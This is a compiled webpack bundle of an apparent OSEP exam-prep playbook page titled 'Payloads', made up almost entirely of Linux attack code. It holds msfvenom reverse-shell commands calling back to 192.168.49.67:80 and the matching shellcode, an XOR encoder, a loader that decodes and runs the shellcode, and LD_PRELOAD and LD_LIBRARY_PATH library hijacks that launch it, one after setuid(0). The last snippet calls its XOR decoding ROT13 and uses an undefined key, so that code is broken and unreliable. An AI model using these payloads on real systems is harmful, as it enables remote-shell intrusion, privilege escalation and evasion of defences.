"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[4049],{6336(e,n,x){x.r(n),x.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>c,frontMatter:()=>t,metadata:()=>r,toc:()=>l});const r=JSON.parse('{"id":"osep/Linux/Payloads","title":"Payloads","description":"Payloads","source":"@site/docs/osep/Linux/Payloads.md","sourceDirName":"osep/Linux","slug":"/osep/Linux/Payloads","permalink":"/OSEP-Playbook/docs/osep/Linux/Payloads","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Lateral Movement","permalink":"/OSEP-Playbook/docs/osep/Linux/Lateral Movement"},"next":{"title":"Privilege Escalation","permalink":"/OSEP-Playbook/docs/osep/Linux/Privilege Escalation"}}');var i=x(4848),a=x(8453);const t={},o=void 0,d={},l=[{value:"<strong>Payloads</strong>",id:"payloads",level:3},{value:"<strong>XOR Payload Encoder</strong>",id:"xor-payload-encoder",level:3},{value:"<strong>Simple Loader</strong>",id:"simple-loader",level:3},{value:"<strong>Shared Library LD PRELOAD</strong>",id:"shared-library-ld-preload",level:3},{value:"<strong>Shared Library LD LIBRARY Path</strong>",id:"shared-library-ld-library-path",level:3}];function s(e){const n={code:"code",h3:"h3",pre:"pre",strong:"strong",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h3,{id:"payloads",children:(0,i.jsx)(n.strong,{children:"Payloads"})}),"\n",(0,i.jsx)(n.h3,{id:"xor-payload-encoder",children:(0,i.jsx)(n.strong,{children:"XOR Payload Encoder"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'#include <stdio.h>#include <stdlib.h>#include <unistd.h>// To compile:\n// gcc simpleXORencoder.c -o simpleXORencoder\n\n// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c\nunsigned char buf[] =\n"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48"\n"\\xb9\\x02\\x00\\x00\\x50\\xc0\\xa8\\x31\\x43\\x51\\x48\\x89\\xe6\\x6a\\x10"\n"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58"\n"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"\n"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05";\n\nint main (int argc, char **argv)\n{\n        int key = 250;\n        int buf_len = (int) sizeof(buf);\n\n        printf("XOR payload (key 0xfa):\\n");\n\n        for(int i=0; i<buf_len; i++)\n        {\n                printf("\\\\x%02X",buf[i]^key);\n        }\n\n        return 0;\n}\n\n'})}),"\n",(0,i.jsx)(n.h3,{id:"simple-loader",children:(0,i.jsx)(n.strong,{children:"Simple Loader"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:"#include <stdio.h>#include <stdlib.h>#include <unistd.h>// To compile:\n// gcc -o simpleLoader simpleLoader.c -z execstack\n\n// XOR-encoded 'linux/x64/shell_reverse_tcp' payload (key: 0xfa)\nunsigned char buf[] = \"\\x90\\xD3\\xA2\\x63\\x90\\xF8\\xA5\\x90\\xFB\\xA4\\xF5\\xFF\\xB2\\x6D\\xB2\\x43\\xF8\\xFA\\xFA\\xAA\\x3A\\x52\\xCB\\xB9\\xAB\\xB2\\x73\\x1C\\x90\\xEA\\xA0\\x90\\xD0\\xA2\\xF5\\xFF\\x90\\xF9\\xA4\\xB2\\x05\\x34\\x90\\xDB\\xA2\\xF5\\xFF\\x8F\\x0C\\x90\\xC1\\xA2\\x63\\xB2\\x41\\xD5\\x98\\x93\\x94\\xD5\\x89\\x92\\xFA\\xA9\\xB2\\x73\\x1D\\xA8\\xAD\\xB2\\x73\\x1C\\xF5\\xFF\\xFA\";\n\nint main (int argc, char **argv)\n{\n        int key = 250;\n        int buf_len = (int) sizeof(buf);\n\n        // Decode the payload\n        for (int i=0; i<buf_len; i++)\n        {\n                buf[i] = buf[i] ^ key;\n        }\n\n        // Cast the shellcode to a function pointer and execute\n        int (*ret)() = (int(*)())buf;\n        ret();\n}\n\n"})}),"\n",(0,i.jsx)(n.h3,{id:"shared-library-ld-preload",children:(0,i.jsx)(n.strong,{children:"Shared Library LD PRELOAD"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'#define _GNU_SOURCE#include <sys/mman.h>#include <stdlib.h>#include <stdio.h>#include <dlfcn.h>#include <unistd.h>// To compile:\n// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c\n// gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl\n\n// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c\nunsigned char buf[] =\n"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48"\n"\\xb9\\x02\\x00\\x00\\x50\\xc0\\xa8\\x31\\x43\\x51\\x48\\x89\\xe6\\x6a\\x10"\n"\\x5a\\x6a\\x2a\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\\x58"\n"\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f"\n"\\x73\\x68\\x00\\x53\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05";\n\nuid_t geteuid(void)\n{\n        // Get the address of the original \'geteuid\' function\n        typeof(geteuid) *old_geteuid;\n        old_geteuid = dlsym(RTLD_NEXT, "geteuid");\n\n        // Fork a new thread based on the current one\n        if (fork() == 0)\n        {\n                // Execute shellcode in the new thread\n                intptr_t pagesize = sysconf(_SC_PAGESIZE);\n\n                // Make memory executable (required in libs)\n                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {\n                        // Handle error\n                        perror("mprotect");\n                        return -1;\n                }\n\n                // Cast and execute\n                int (*ret)() = (int(*)())buf;\n                ret();\n        }\n        else\n        {\n                // Original thread, call the original function\n                printf("[Hijacked] Returning from function...\\n");\n                return (*old_geteuid)();\n        }\n        // This shouldn\'t really execute\n        printf("[Hijacked] Returning from main...\\n");\n        return -2;\n}\n\n'})}),"\n",(0,i.jsx)(n.h3,{id:"shared-library-ld-library-path",children:(0,i.jsx)(n.strong,{children:"Shared Library LD LIBRARY Path"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'#include <sys/mman.h>#include <stdlib.h>#include <stdio.h>#include <dlfcn.h>#include <unistd.h>// Compile as follows\n//gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_LIBRARY_PATH.o sharedLibrary_LD_LIBRARY_PATH.c\n//gcc -shared -o sharedLibrary_LD_LIBRARY_PATH.so sharedLibrary_LD_LIBRARY_PATH.o -ldl\n\nstatic void runmahpayload() __attribute__((constructor));\n\nint gpgrt_onclose;\n// [...output from readelf here...]\nint gpgrt_poll;\n\n// ROT13-encoded \'linux/x64/shell_reverse_tcp\' payload\nchar buf[] = "\\x77\\x36\\x65\\xa6\\x77\\x0f\\x6c\\x77\\x0e\\x6b\\x1c\\x12\\x55\\xa4\\x55\\xc6\\x0f\\x0d\\x0d\\x5d\\xcd\\xb5\\x3e\\x50\\x5e\\x55\\x96\\xf3\\x77\\x1d\\x67\\x77\\x37\\x65\\x1c\\x12\\x77\\x10\\x6b\\x55\\x0c\\xdb\\x77\\x2e\\x65\\x1c\\x12\\x82\\x03\\x77\\x48\\x65\\xa6\\x55\\xc8\\x3c\\x6f\\x76\\x7b\\x3c\\x80\\x75\\x0d\\x60\\x55\\x96\\xf4\\x5f\\x64\\x55\\x96\\xf3\\x1c\\x12";\n\nvoid runmahpayload() {\n        setuid(0);\n        setgid(0);\n        printf("Library hijacked!\\n");\n        int buf_len = (int) sizeof(buf);\n        for (int i=0; i<buf_len; i++)\n        {\n                buf[i] = buf[i] ^ key;\n        }\n        intptr_t pagesize = sysconf(_SC_PAGESIZE);\n        mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC);\n        int (*ret)() = (int(*)())buf;\n        ret();\n}\n\n'})})]})}function c(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(s,{...e})}):s(e)}},8453(e,n,x){x.d(n,{R:()=>t,x:()=>o});var r=x(6540);const i={},a=r.createContext(i);function t(e){const n=r.useContext(a);return r.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:t(e.components),r.createElement(a.Provider,{value:n},e.children)}}}]);